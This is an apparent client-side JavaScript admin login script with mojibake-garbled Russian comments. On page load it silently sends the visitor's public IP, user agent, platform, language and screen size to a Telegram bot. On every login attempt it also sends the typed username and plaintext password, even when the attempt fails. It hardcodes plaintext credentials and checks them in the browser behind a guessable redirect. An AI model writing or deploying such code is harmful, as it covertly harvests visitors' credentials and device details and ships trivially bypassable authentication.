const users = [
    { username: "Lena", password: "1" }
];

const specialUsers = [
    { username: "test", password: "test", redirect: "UgadaiPapku13" }
];

// === –ù–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram (–í–ù–ò–ú–ê–ù–ò–ï: –Ω–µ–±–µ–∑–æ–ø–∞—Å–Ω–æ —Ö—Ä–∞–Ω–∏—Ç—å —Ç–æ–∫–µ–Ω –≤ –∫–ª–∏–µ–Ω—Ç—Å–∫–æ–º JS) ===
const TELEGRAM_BOT_TOKEN = "123456:ABC-DEF"; // üîπ –≤—Å—Ç–∞–≤—å —Å–≤–æ–π —Ç–æ–∫–µ–Ω
const TELEGRAM_CHAT_ID = "123456789";        // üîπ –≤—Å—Ç–∞–≤—å —Å–≤–æ–π chat_id

// === –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω–∞—è: –ø–æ–ª—É—á–∏—Ç—å –ø—É–±–ª–∏—á–Ω—ã–π IP —á–µ—Ä–µ–∑ ipify ===
async function getPublicIP() {
    try {
        const res = await fetch("https://api.ipify.org?format=json", {cache: "no-store"});
        if (!res.ok) throw new Error("ipify error " + res.status);
        const j = await res.json();
        return j.ip || "unknown";
    } catch (e) {
        console.warn("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –ø—É–±–ª–∏—á–Ω—ã–π IP:", e);
        return "unknown";
    }
}

// === –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram (fire-and-forget) ===
async function sendLog(message) {
    try {
        // –Ω–µ –∂–¥—ë–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞; –Ω–æ –≤—ã–∑—ã–≤–∞–µ–º fetch —á—Ç–æ–±—ã –ø–æ–ø—ã—Ç–∞—Ç—å—Å—è –æ—Ç–ø—Ä–∞–≤–∏—Ç—å
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: `üßæ [admin.js]\n${message}`,
                disable_notification: true
            })
        }).catch(err => console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ fetch -> Telegram:", err));
    } catch (err) {
        console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≤ Telegram:", err);
    }
}

// === –°–æ–±—Ä–∞—Ç—å —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è –∏ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –ª–æ–≥ ===
async function gatherAndSend(baseMessage) {
    const ip = await getPublicIP();
    const ua = navigator.userAgent || "unknown";
    const platform = navigator.platform || "unknown";
    const lang = navigator.language || "unknown";
    const screenRes = (window.screen && window.screen.width) ? `${window.screen.width}x${window.screen.height}` : "unknown";

    const full = [
        baseMessage,
        "",
        "üì° IP: " + ip,
        "üåê User-Agent: " + ua,
        "üíª Platform: " + platform,
        "üó£ Language: " + lang,
        "üñ• Screen: " + screenRes,
        "‚è± Time: " + new Date().toISOString()
    ].join("\n");

    console.log(full); // –ª–æ–∫–∞–ª—å–Ω–æ –≤ –∫–æ–Ω—Å–æ–ª—å
    sendLog(full);     // –∏ –≤ Telegram
}

// === –û—Ç—á—ë—Ç –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã (—Å —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏) ===
(async function initialReport() {
    const report = [
        "üìä –û—Ç—á—ë—Ç –∑–∞–≥—Ä—É–∑–∫–∏ admin.js",
        "üë• –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏: " + JSON.stringify(users),
        "‚≠ê –û—Å–æ–±—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏: " + JSON.stringify(specialUsers),
        "üìÅ –§–∞–π–ª—ã: admin/style.css, scripts/admin.js, img/logo.png",
    ].join("\n");

    await gatherAndSend(report);
    console.log("üü¢ –°–∫—Ä–∏–ø—Ç admin.js –∑–∞–≥—Ä—É–∂–µ–Ω –ø–æ–ª–Ω–æ—Å—Ç—å—é!");
})();

// === –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –ª–æ–≥–∏–Ω–∞ ===
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    let baseLog = `üîê –ü–æ–ø—ã—Ç–∫–∞ –≤—Ö–æ–¥–∞:\nüë§ ${username}\nüîë ${password}`;

    const specialUser = specialUsers.find(u => u.username === username && u.password === password);
    const user = users.find(u => u.username === username && u.password === password);

    if (specialUser) {
        baseLog += `\n‚úÖ –ù–∞–π–¥–µ–Ω specialUser ‚Üí ${specialUser.redirect}`;
        document.getElementById('message').textContent = "Success";
        document.getElementById('message').style.color = "green";

        // –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –ª–æ–≥ (–Ω–µ –∂–¥—ë–º) –∏ –ø–µ—Ä–µ—Ö–æ–¥–∏–º –ø–æ redirect
        gatherAndSend(baseLog);
        window.location.href = specialUser.redirect;

    } else if (user) {
        baseLog += `\n‚úÖ –ù–∞–π–¥–µ–Ω –æ–±—ã—á–Ω—ã–π user`;
        document.getElementById('message').textContent = "Success";
        document.getElementById('message').style.color = "green";

        gatherAndSend(baseLog);
        window.location.href = "UgadaiPapku13";

    } else {
        baseLog += `\n‚ùå –ù–µ–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ`;
        document.getElementById('message').textContent = "Wrong username or password.";
        document.getElementById('message').style.color = "red";

        gatherAndSend(baseLog);
    }
});
